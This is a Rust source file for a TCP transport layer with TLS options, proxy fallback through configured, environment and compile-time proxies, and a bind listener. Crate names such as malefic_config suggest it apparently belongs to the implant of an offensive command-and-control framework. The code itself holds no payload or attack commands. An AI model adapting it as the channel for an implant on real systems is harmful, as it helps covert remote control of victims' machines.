#[cfg(feature = "tls_rustls")]
pub mod tls;

#[cfg(feature = "tls_native")]
pub mod native_tls;

#[cfg(feature = "proxy")]
use crate::proxie::{AsyncProxy, Auth, HTTPProxy, SOCKS5Proxy};
use crate::{DialerExt, TransportImpl};
use anyhow::Result;
use async_net::TcpStream;
use async_trait::async_trait;
use futures::{AsyncRead, AsyncWrite};
use malefic_common::debug;
#[cfg(feature = "proxy")]
use malefic_config::{
    PROXY_HOST, PROXY_PASSWORD, PROXY_PORT, PROXY_URL, PROXY_USERNAME, USE_ENV_PROXY,
};
#[cfg(feature = "proxy")]
use std::env;
use std::pin::Pin;
use std::task::{Context, Poll};
#[cfg(feature = "proxy")]
use url::Url;

#[cfg(feature = "tls_rustls")]
pub use tls::TlsConfig;

pub enum TCPTransport<T: TransportImpl = TcpStream> {
    Plain(T),
    #[cfg(feature = "tls_rustls")]
    RustlsTls(futures_rustls::client::TlsStream<T>),
    #[cfg(feature = "tls_native")]
    NativeTls(async_native_tls::TlsStream<T>),
}

impl<T: TransportImpl> TCPTransport<T> {
    pub fn new_plain(stream: T) -> Self {
        TCPTransport::Plain(stream)
    }
}

impl TCPTransport<TcpStream> {
    pub async fn new(stream: TcpStream, _config: malefic_config::ServerConfig) -> Result<Self> {
        // Determine TLS intent from runtime config:
        // - None  → plain TCP (no TLS config provided)
        // - Some(enable=true)  → use TLS
        // - Some(enable=false) → plain TCP (e.g. switch targets without TLS)
        let tls_enabled = _config.tls_config.as_ref().map_or(false, |t| t.enable);

        if !tls_enabled {
            return Ok(TCPTransport::Plain(stream));
        }

        cfg_if::cfg_if! {
            if #[cfg(feature = "tls_rustls")] {
                let tls_config = tls::build_tls_config(_config);
                Self::new_with_rustls(stream, tls_config).await
            } else if #[cfg(feature = "tls_native")] {
                let ntls_config = native_tls::build_native_tls_config(_config);
                Self::new_with_native_tls(stream, ntls_config).await
            } else {
                Ok(TCPTransport::Plain(stream))
            }
        }
    }

    #[cfg(feature = "tls_rustls")]
    pub async fn new_with_rustls(stream: TcpStream, config: TlsConfig) -> Result<Self> {
        let server_name = if config.server_name.is_empty() {
            "localhost".to_string()
        } else {
            config.server_name.clone()
        };
        debug!("[tls] Connecting to {} with rustls", server_name);
        let connector = tls::TlsConnectorBuilder::new(config).build()?;
        let sni = rustls::pki_types::ServerName::try_from(server_name.as_str())
            .map_err(|e| anyhow::anyhow!("Invalid server name: {}", e))?
            .to_owned();
        let tls_stream = connector.connect(sni, stream).await?;
        debug!("[tls] TLS handshake completed successfully");
        Ok(TCPTransport::RustlsTls(tls_stream))
    }

    /// Backward-compatible alias
    #[cfg(feature = "tls_rustls")]
    pub async fn new_with_tls(stream: TcpStream, config: TlsConfig) -> Result<Self> {
        Self::new_with_rustls(stream, config).await
    }

    #[cfg(feature = "tls_native")]
    pub async fn new_with_native_tls(
        stream: TcpStream,
        config: native_tls::NativeTlsConfig,
    ) -> Result<Self> {
        let server_name = if config.server_name.is_empty() {
            "localhost".to_string()
        } else {
            config.server_name.clone()
        };
        debug!("[tls] Connecting to {} with native-tls", server_name);
        let connector = native_tls::NativeTlsConnectorBuilder::new(config).build()?;
        let tls_stream = connector.connect(&server_name, stream).await?;
        debug!("[tls] Native TLS handshake completed successfully");
        Ok(TCPTransport::NativeTls(tls_stream))
    }
}

impl<T: TransportImpl> AsyncRead for TCPTransport<T> {
    fn poll_read(
        mut self: Pin<&mut Self>,
        cx: &mut Context<'_>,
        buf: &mut [u8],
    ) -> Poll<Result<usize, std::io::Error>> {
        match &mut *self {
            TCPTransport::Plain(stream) => Pin::new(stream).poll_read(cx, buf),
            #[cfg(feature = "tls_rustls")]
            TCPTransport::RustlsTls(tls_stream) => Pin::new(tls_stream).poll_read(cx, buf),
            #[cfg(feature = "tls_native")]
            TCPTransport::NativeTls(tls_stream) => Pin::new(tls_stream).poll_read(cx, buf),
        }
    }
}

impl<T: TransportImpl> AsyncWrite for TCPTransport<T> {
    fn poll_write(
        mut self: Pin<&mut Self>,
        cx: &mut Context<'_>,
        buf: &[u8],
    ) -> Poll<Result<usize, std::io::Error>> {
        match &mut *self {
            TCPTransport::Plain(stream) => Pin::new(stream).poll_write(cx, buf),
            #[cfg(feature = "tls_rustls")]
            TCPTransport::RustlsTls(tls_stream) => Pin::new(tls_stream).poll_write(cx, buf),
            #[cfg(feature = "tls_native")]
            TCPTransport::NativeTls(tls_stream) => Pin::new(tls_stream).poll_write(cx, buf),
        }
    }

    fn poll_flush(
        mut self: Pin<&mut Self>,
        cx: &mut Context<'_>,
    ) -> Poll<Result<(), std::io::Error>> {
        match &mut *self {
            TCPTransport::Plain(stream) => Pin::new(stream).poll_flush(cx),
            #[cfg(feature = "tls_rustls")]
            TCPTransport::RustlsTls(tls_stream) => Pin::new(tls_stream).poll_flush(cx),
            #[cfg(feature = "tls_native")]
            TCPTransport::NativeTls(tls_stream) => Pin::new(tls_stream).poll_flush(cx),
        }
    }

    fn poll_close(
        mut self: Pin<&mut Self>,
        cx: &mut Context<'_>,
    ) -> Poll<Result<(), std::io::Error>> {
        match &mut *self {
            TCPTransport::Plain(stream) => Pin::new(stream).poll_close(cx),
            #[cfg(feature = "tls_rustls")]
            TCPTransport::RustlsTls(tls_stream) => Pin::new(tls_stream).poll_close(cx),
            #[cfg(feature = "tls_native")]
            TCPTransport::NativeTls(tls_stream) => Pin::new(tls_stream).poll_close(cx),
        }
    }
}

#[derive(Clone)]
pub struct TCPClient;

impl TCPClient {
    pub fn new() -> Result<Self> {
        Ok(TCPClient)
    }

    pub fn new_with_alias(_alias: Option<&str>) -> Result<Self> {
        Self::new()
    }
}

#[async_trait]
impl DialerExt for TCPClient {
    async fn connect(
        &mut self,
        target: &crate::server_manager::Target,
    ) -> Result<TCPTransport<TcpStream>> {
        let config = target.server_config();
        let tcp_stream = new_steam(config).await?;
        TCPTransport::new(tcp_stream, config.clone()).await
    }
}

pub async fn new_steam(config: &malefic_config::ServerConfig) -> Result<TcpStream> {
    #[cfg(feature = "proxy")]
    {
        if !PROXY_URL.is_empty() {
            debug!("[tcp] Using configured proxy URL: {}", *PROXY_URL);
            if let Some(stream) = try_proxy_url(&PROXY_URL, &config.address).await {
                return Ok(stream);
            }
            debug!("[tcp] Configured proxy failed, falling back");
        }

        if *USE_ENV_PROXY && PROXY_URL.is_empty() {
            debug!("[tcp] Checking environment variables for proxy");
            if let Some(stream) = try_env_proxy(&config.address).await {
                return Ok(stream);
            }
            debug!("[tcp] Environment proxy not found or failed, falling back");
        }

        if !PROXY_HOST.is_empty() && *PROXY_PORT != "0" {
            debug!("[tcp] Using compile-time proxy configuration");
            if let Some(stream) = try_compile_time_proxy(&config.address).await {
                return Ok(stream);
            }
            debug!("[tcp] Compile-time proxy failed, falling back to direct connection");
        }
    }

    debug!("[tcp] Connecting directly to {}", config.address);
    TcpStream::connect(config.address.as_str())
        .await
        .map_err(|e| anyhow::anyhow!("TCP connect error: {}", e))
}

#[cfg(feature = "proxy")]
async fn try_proxy_url(proxy_url: &str, target: &str) -> Option<TcpStream> {
    if let Ok(url) = Url::parse(proxy_url) {
        let host = url.host_str()?.to_string();
        let port = url.port().unwrap_or_else(|| match url.scheme() {
            "http" | "https" => 8080,
            "socks5" | "socks" => 1080,
            _ => 8080,
        });
        let auth = if !url.username().is_empty() {
            Auth::new(url.username(), url.password().unwrap_or(""))
        } else {
            None
        };
        match url.scheme() {
            "http" | "https" => {
                let proxy = HTTPProxy::new(&host, port, auth);
                proxy.connect(target).await.ok().map(|s| s.into_tcpstream())
            }
            "socks5" | "socks" => {
                let proxy = SOCKS5Proxy::new(&host, port, auth);
                proxy.connect(target).await.ok().map(|s| s.into_tcpstream())
            }
            _ => {
                debug!("[tcp] Unsupported proxy scheme: {}", url.scheme());
                None
            }
        }
    } else {
        debug!("[tcp] Invalid proxy URL: {}", proxy_url);
        None
    }
}

#[cfg(feature = "proxy")]
async fn try_env_proxy(target: &str) -> Option<TcpStream> {
    if should_skip_proxy(target) {
        return None;
    }
    let proxy_vars = ["HTTPS_PROXY", "HTTP_PROXY", "SOCKS_PROXY"];
    for var_name in &proxy_vars {
        if let Ok(proxy_url_str) = env::var(var_name) {
            debug!(
                "[tcp] Found {} environment variable: {}",
                var_name, proxy_url_str
            );
            if let Some(stream) = try_proxy_url(&proxy_url_str, target).await {
                return Some(stream);
            }
        }
    }
    None
}

#[cfg(feature = "proxy")]
async fn try_compile_time_proxy(target: &str) -> Option<TcpStream> {
    if let Ok(port) = PROXY_PORT.parse::<u16>() {
        let auth = if !PROXY_USERNAME.is_empty() {
            Auth::new(&PROXY_USERNAME, &PROXY_PASSWORD)
        } else {
            None
        };
        let proxy = HTTPProxy::new(&PROXY_HOST, port, auth);
        proxy.connect(target).await.ok().map(|s| s.into_tcpstream())
    } else {
        None
    }
}

#[cfg(feature = "proxy")]
fn should_skip_proxy(target: &str) -> bool {
    if let Ok(no_proxy) = env::var("NO_PROXY") {
        let target_host = if let Some(colon_pos) = target.rfind(':') {
            &target[..colon_pos]
        } else {
            target
        }
        .to_lowercase();
        for no_proxy_item in no_proxy.split(',') {
            let item = no_proxy_item.trim().to_lowercase();
            if item.is_empty() {
                continue;
            }
            if target_host == item {
                return true;
            }
            if item.starts_with('.') && target_host.ends_with(&item) {
                return true;
            }
            if item == "localhost" && (target_host == "localhost" || target_host == "127.0.0.1") {
                return true;
            }
        }
    }
    false
}

#[cfg(feature = "bind")]
use crate::ListenerExt;
#[cfg(feature = "bind")]
use async_net::TcpListener;

#[cfg(feature = "bind")]
pub struct TCPListenerExt {
    listener: TcpListener,
}

#[cfg(feature = "bind")]
#[async_trait]
impl ListenerExt for TCPListenerExt {
    async fn bind(addr: &str) -> Result<Self> {
        let listener = TcpListener::bind(addr).await?;
        Ok(TCPListenerExt { listener })
    }

    async fn accept(&mut self) -> Result<TCPTransport> {
        let (stream, _addr) = self.listener.accept().await?;
        Ok(TCPTransport::new_plain(stream))
    }
}
